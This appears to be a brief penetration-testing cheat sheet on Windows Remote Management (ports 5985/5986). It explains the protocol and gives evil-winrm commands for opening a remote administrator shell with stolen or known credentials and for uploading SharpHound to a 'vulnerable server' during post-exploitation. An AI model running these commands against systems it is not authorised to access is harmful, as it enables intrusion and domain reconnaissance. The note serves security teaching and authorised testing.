# WinRM: Port 5985,5986

Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell.

The [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) program can be used on any Microsoft Windows Servers with WinRM feature enabled (usually at port 5985), provided we have credentials and permissions to use it, i.e., it could be used in a **post-exploitation** phase.

* **Install** `evil-winrm`

        gem install evil-winrm

* **Launch** `evil-winrm` to gain shell access as a local administrator

        evil-winrm -i <IP> -u USERNAME -p PASSWORD

* **Upload files** to the vulnerable server

        upload SharpHound.exe C:\Users\Public\s.exe

## References

* https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-winrm
* https://github.com/Hackplayers/evil-winrm